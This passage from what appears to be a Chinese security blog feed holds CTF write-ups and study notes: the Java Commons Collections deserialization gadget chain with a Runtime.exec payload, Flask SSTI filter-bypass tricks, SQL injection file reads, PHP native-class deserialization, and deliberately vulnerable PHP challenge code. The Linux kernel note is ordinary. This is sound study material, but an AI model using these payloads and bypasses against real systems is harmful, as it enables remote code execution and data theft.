            <span class="token function">Map</span><span class="token punctuation">(</span>Proxy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    LazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        ChainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            ConstantTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Class<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h5 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get"></a>LazyMap.get</h5><p>这个就是LazyMap的get方法，可以看到，当查找的key不存在时，调用自身factory属性的transform方法，factory即为一个Transformer类对象</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>而ChainedTransformer, ConstantTransformer, InvokerTransformer均为其子类</p>
<h5 id="Transformer命令执行"><a href="#Transformer命令执行" class="headerlink" title="Transformer命令执行"></a>Transformer命令执行</h5><p>而ChainedTransformer的transform方法就是将其内部的Transformer的transform方法全部按顺序调用一遍，并且这次的结果是下次的输入</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> object<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>ConstantTransformer是无论输入如何，返回自己初始化时的对象</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">ConstantTransformer</span><span class="token punctuation">(</span>Object constantToReturn<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant <span class="token operator">=</span> constantToReturn<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>InvokerTransformer就比较猛，初始化时输入方法名和参数，transform方法输入一个对象，然后调用这个对象的方法并输入参数</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">InvokerTransformer</span><span class="token punctuation">(</span>String methodName<span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">catch</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>所以也就有了ChainedTransformer的经典payload</p>
<pre class=" language-java"><code class="language-java">Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"arg"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>exec那里可以填任意数量参数，这一串的最终结果就是<code>java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;arg&quot;...&#125;)</code><br>这串调用的开始是LazyMap的get传入一个key，调用了ChainedTransformer的transform方法，而再依次调用，第一个ConstantTransformer忽略输入的key，返回一个Runtime类，而接下来调用Runtime类的getMethod，拿到一个getRuntime的Method对象，再使用Method对象的invoke方法，获取到Runtime类的getRuntime方法，最后用getRuntime方法取得的进程执行exec</p>
<p>这个地方的getMethod超级套娃，InvokerTransformer的transform方法中有这么一段</p>
<pre class=" language-java"><code class="language-java">    Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>那么<code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;)</code>这个transformer，调用了Runtime类的getMethod方法，用Runtime类的getMethod方法去获取到了一个封装了getMethod方法的Method对象，再用invoke调用这个封装的getMethod，使用参数getRuntime，获取到一个封装了getRuntime方法的Method对象</p>
<h5 id="由AnnotationInvocationHandler到LazyMap-get"><a href="#由AnnotationInvocationHandler到LazyMap-get" class="headerlink" title="由AnnotationInvocationHandler到LazyMap.get"></a>由AnnotationInvocationHandler到LazyMap.get</h5><p>还是有源码后看源码调用更能直观理解。。。<br>AnnotationInvocationHandler中的readObject中有这么一段</p>
<pre class=" language-java"><code class="language-java">Map map <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    String str <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Class <span class="token class-name">clazz</span> <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>调用了自身Map类的一个entrySet()函数，而由于一些我不能理解的java特性（java 的动态代理机制），调用这个函数最后会调用到AnnotationInvocationHandler的invoke函数上，里面有这么一段</p>
<pre class=" language-java"><code class="language-java">    String str <span class="token operator">=</span> paramMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    Object object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>这里的memberValues就是一个Map，LazyMap是其子类，所以成功调用到LazyMap的get方法，而LazyMap里面就一个ChainTransformer，必然查不到，直接进ChainTransformer的transform，完成利用链</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Java的反序列化因为涉及的类很多，方法很复杂，所以给人很复杂的感觉（虽然PHP也有那种超级长的pop链，但是由于都是魔术方法互相调用感觉看的清楚一点），Java这里要记忆的类有点多了。。但是反序列化的入口点都是readObject，然后就看每个类的readObject里面能对什么对象调用什么方法，也是一个一个的凑最后能点爆一个构造好的ChainTransformer执行命令</p>
<p>这种凑gadget的方法也行也能用的很灵活吧？搜集一些有各种各样小功能的类，万一那天一个类没了就拼拼凑凑又接上去了。TiedMapEntry给ban了，明天就能从其他gadget中拼拼凑凑又拿出一个从toString()到get()的调用链<br>也许多审计代码记录一些可用gadget，就能拼拼凑凑出一个新的漏洞，这就是积累吧<br>（最近看到的几个一系列的漏洞就是官方补一个马上用其他的小零件拼拼凑凑又摸出一个洞来）</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>强力推荐<br><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射：入门、使用、原理</a><br>反序列化漏洞超级详细思路，但是代码具体好像还是省略了一点<br><a href="https://www.freebuf.com/vuls/170344.html">Java反序列化漏洞的原理分析</a><br>rmb神仙的反序列化讲解，这个的具体代码多一点，看懂了上一篇再看这个就基本上能理解了呜呜呜<br><a href="https://xz.aliyun.com/t/7157">ysoserial URLDNS, CommonsCollections1-7 分析+复现</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核运行方式</title>
    <url>/Linux%E5%86%85%E6%A0%B8%E8%BF%90%E8%A1%8C.html</url>
    <content><![CDATA[<h1 id="Linux内核运行方式"><a href="#Linux内核运行方式" class="headerlink" title="Linux内核运行方式"></a>Linux内核运行方式</h1><p>前两天被AA问了个问题，<strong>你觉得Linux的内核是一个进程吗</strong><br>第一反应自然是一个进程，但是接下来就被问到了内核是一个进程的话，进程调度是怎么实现的，以进程来管理进程吗之类的问题<br>所以首先应该能给出答案，<strong>Linux的内核并不是一个进程</strong><br>那么接下来就出现了第二个问题，内核并不是一个进程，那么如何做到进程调度，内存管理这些事情的呢</p>
<p>为此查了一个下午各种各样的资料</p>
<p>众所周知，一个进程拥有内核空间和用户空间两个空间，用户空间存放的就是进程自己的数据，代码，堆栈之类的东西，还有一个libc函数库，而内核空间则是映射到内核数据区。也就是说，内核数据在物理内存上只有一份，但是会在每个进程中映射一份，内核数据就是各个进程的进程控制块，操作系统的资源分配表，文件标识符之类的各种各样的资源，还有就是系统调用函数，以及一系列的内核相关函数。</p>
<p>只有在系统刚启动时，内核可能表现的像一个进程，当启动完成后，内核会启动一部分线程，提供相应的服务，这些进程可以在ps里面看到，都由方括号包裹起来，标识为内核启动的线程。而更多的情况下，内核表现的更像是一个巨大的函数库，也可以说内核是运行在用户进程里的，当用户进程发起系统调用时，进入内核态，这并不是说内核开始运行，而是用户进程调用内核函数，去访问内核数据。</p>
<p>对于读写等操作是很便于理解的，进程进入内核态，仍是该进程在运行，通过系统调用接口获取了内核数据<br>但最令人困惑也是最典型的应当是进程调度（这段我也没有十足的把握），因为内核不能作为进程运行，调度的载体就变成了自身，暂且考虑两个情况：<br>    1.进程由于IO等待一类的事务主动挂起，这时进程同样是通过系统调用进入内核态，使用内核中的调度算法并修改内核数据结构，可以理解为以当前进程程为载体，内核完成了一次进程调度？<br>    2.进程由于时间片到期被剥夺，这时进程由于是被剥夺了运行权利，自然不可能由其本身发起一个中断进入内核，而内核本身并不是一个运行的进程，所以内核也不能够发起这个中断。因此，这个中断是由硬件产生的，通过硬件中断迫使进程进入内核态，走一遍调度流程完成调度</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>搜了一大堆资料，就这个知乎的问答感觉说的最清楚<br><a href="https://www.zhihu.com/question/309060309/answer/575332809">https://www.zhihu.com/question/309060309/answer/575332809</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>MAR DASCTF2021</title>
    <url>/MAR%20DASCTF2021.html</url>
    <content><![CDATA[<h1 id="MAR-DASCTF2021"><a href="#MAR-DASCTF2021" class="headerlink" title="MAR DASCTF2021"></a>MAR DASCTF2021</h1><p>平台好卡，环境时不时就访问不上了。卡到不想做题。。。感觉题目也有点莫名其妙的</p>
<h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><p>很容易验证是SSTI，先fuzz一遍过滤的字符<code># &quot;&#39;.0123456789:[\_ config chr request pop</code>大概测出来这些，不给用引号数字点号右括号下划线和几个函数，访问属性可以用<code>attr()|attr()</code>这样子绕，不过下划线这些关键字符还是得想办法搞出来，并且没了数字chr和引号也不好凑字符串了<br>以前看到过”%c”%num这种方法进行格式化字符串来拼字符的，现在的问题就在于引号没得数字没得，凑不出来，看到这么文章上写了这么个东西<br><code>{%set pc = g|lower|list|first|urlencode|first%} 取得%</code><br>用set定义一堆变量开始慢慢拼，g是flask一个奇怪的模块，<code>g|lower|list|first</code>会获得一个字符<code>&lt;</code>，其URL编码为%3C，直接一波获得%c两个字符<br><code>{%set c = g|lower|list|first|urlencode|last|lower%} 取得c</code><br><code>{%set udl=(pc,c)|join%}</code><br>得到”%c”字符串，接下来就要想办法获取数字了，可以像上面的方法如法炮制url反复编码拿到数字，也可以用bool变量加加减减获得数字<code>{%set one=-(False-True)%}</code>，然后一路加法获得所有数字<br>最后通过<code>{%set a=udl%((nine|string, seven|string)|join|int) %}</code>这样子获得<br>最后的最后凑齐字母表再一个个join起来通过attr()形式命令执行</p>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>在模板引擎里面<code>|</code>感觉就是个管道符，也有点像<code>.</code>操作符，可以一层层调用函数套娃的感觉<br>还看到有个大哥使用奇怪编码方式的数字直接绕过对数字的限制打通</p>
<h2 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h2><p>很简单的SQL注入，过滤了flag,update,drop单引号空格什么的，mysql数据库给的root账户<br>过滤约等于没有，空格直接&#x2F;**&#x2F;都能绕，flag不能用就转16进制也能读<br>平台及其卡，幸好是union注入，盲注可能这辈子都注不出来了，最后会在dasf1ag下找到一个flag.txt，用loadfile读文件，验证了&#x2F;etc&#x2F;passwd可读，也试了读根目录和web根目录，但是就是没有，写文件可以写到&#x2F;tmp，但是web目录没有写权限。写&#x2F;tmp也没有什么用，最后我直接读&#x2F;flag读到了flag。。。<br>服了，出题和部署题目的时候记得统一一下，猜路径的时候猜的我想骂人，先给出题人一拳</p>
<p>剩下两个web一个反序列化看不懂，一个SSRF看不懂</p>
<p>看了别人的wp开始复现</p>
<h2 id="Ez-serialize"><a href="#Ez-serialize" class="headerlink" title="Ez_serialize"></a>Ez_serialize</h2><p>代码很简单，看一眼就知道应该是原生类toString利用，搜得到的原生类没有什么能利用的然后也不想fuzz就直接摸鱼了（主要是上一个SQL题搞我心态）<br>贴关键部分代码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>没用<span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>
没用
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// check，不知道在check个啥</span>
    <span class="token keyword">function</span> <span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>就一个check一个反序列化，check过了构造函数构造一个对象然后echo触发toString</p>
<p>找不到原生类就不知道咋打了，看wp<br>使用这两个类</p>
<pre><code>FilesystemIterator
SplFileObject
</code></pre>
<p>第一个类构造函数接受一个目录，toString的时候会把当前目录按字典顺序第一个文件输出出来（好没用）<br>第二个类构造函数接受一个文件路径，toString的时候把该文件的前30个字符输出出来（也好没用）<br>但是就够做这个题了</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>这两个类不能直接序列化和反序列化，在<code>zend_class_unserialize_deny</code>这个配置文件这里有限制。我就说怎么之前从来没见到过这种类的利用。。。这里是额外多了一个工具类调用构造函数才直接拉起来的，正常情况下并不能利用这两个类</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8029">浅谈flask ssti 绕过原理</a><br><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a><br><a href="https://jan.show/?p=59">MAR DASCTF Wp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>LINECTF2022wp</title>
    <url>/LINECTF2022wp.html</url>
    <content><![CDATA[<h1 id="LINECTF2022wp"><a href="#LINECTF2022wp" class="headerlink" title="LINECTF2022wp"></a>LINECTF2022wp</h1><p>好像还不是很坐牢。所以这篇能叫wp</p>
<p>全程看tkmk神仙疯狂输出，我在旁边打杂学习</p>
<p>四个简单一点的题都出了，然后一两个解的几个题没心情看呜呜<br>说到最后还是只会做简单题的垃圾呜呜</p>
<h2 id="bb"><a href="#bb" class="headerlink" title="bb"></a>bb</h2><p>又见p神文章题<br>这次直接给了bash，但是不给字母了。然后还是一样的命令执行</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ptn</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$ptn</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
